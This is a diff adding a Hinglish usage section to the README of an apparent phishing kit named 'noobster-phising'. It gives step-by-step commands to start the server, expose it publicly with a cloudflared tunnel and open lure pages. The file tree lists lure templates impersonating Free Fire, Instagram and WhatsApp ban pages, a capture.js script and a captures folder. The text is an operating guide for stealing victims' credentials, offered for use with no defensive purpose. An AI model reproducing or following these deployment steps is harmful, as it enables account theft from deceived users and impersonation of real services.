@@ -47,3 +47,63 @@ git clone https://github.com/noob-bhai/noobster-phising.git
 cd noobster-phising
 pip install -r requirements.txt
 python run.py
+
+
+▶️ Usage
+
+Step 1 — server start
+
+```bash
+python3 run.py
+```
+
+menu aayega → 1 (ya 2/3/4) choose karo → 0 dabao
+
+Step 2 — tunnel (alag terminal)
+
+```bash
+cloudflared tunnel --url http://localhost:5000
+```
+
+link milega jaise https://xyz.trycloudflare.com
+
+Step 3 — page khol
+
+```
+https://xyz.trycloudflare.com/freefire
+```
+
+---
+
+📂 File Structure
+
+```
+noobster/
+├── run.py
+├── requirements.txt
+├── static/
+│   ├── style.css
+│   └── capture.js
+├── templates/
+│   ├── freefire.html
+│   ├── ig_ban.html
+│   ├── ig_download.html
+│   └── wa_ban.html
+└── captures/
+```
+
+---
+
+📢 Channel
+
+Join for updates: t.me/noob11001
+
+---
+
+📜 License
+
+MIT — use at your own risk.
+
+```
+
+---
